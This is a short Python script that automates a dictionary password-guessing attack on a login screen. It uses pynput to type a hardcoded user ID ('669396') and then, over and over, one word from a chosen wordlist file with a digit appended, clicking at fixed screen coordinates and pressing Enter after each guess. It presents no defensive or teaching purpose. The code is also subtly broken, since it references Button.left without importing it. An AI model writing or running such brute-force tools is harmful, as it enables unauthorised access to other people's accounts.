from pynput.keyboard import Key, Controller, Listener
import pynput.mouse as pymouse
import time
import os

library = ('G1.txt', 'G2.txt', 'G3.txt', 'G4.txt', 'G5.txt', 'G6.txt', 'G7.txt')
#A-Coat
#Coax-Flex
#Flip - Jivy
#Jobs-Nick
#Nigh-Rook
#Room-Tips
#Tire-Zyme
n = int(input("1-7\n"))-1

USER = '669396'

time.sleep(3)

with open(library[n], 'r') as w:
    
    kb = Controller()
    mouse = pymouse.Controller()
    
    for i in range(0, 359):
            
            tmp = w.readline()
            tmp = tmp.rstrip('\n')
            
            for j in range(0, 10):
                
                time.sleep(1)
                
                mouse.position = (739,165)
                
                password = tmp + str(j)
                print(password)
                
                for x in range(len(USER)):
                    
                    kb.press(USER[x])
                    kb.release(USER[x])
                
                time.sleep(0.5)
                    
                mouse.move(0,45)
                mouse.press(Button.left)
                mouse.release(Button.left)
 
                for x in range(len(password)):
                    
                    kb.press(password[x])
                    kb.release(password[x])
                    
                time.sleep(1)
                
                kb.press(Key.enter)


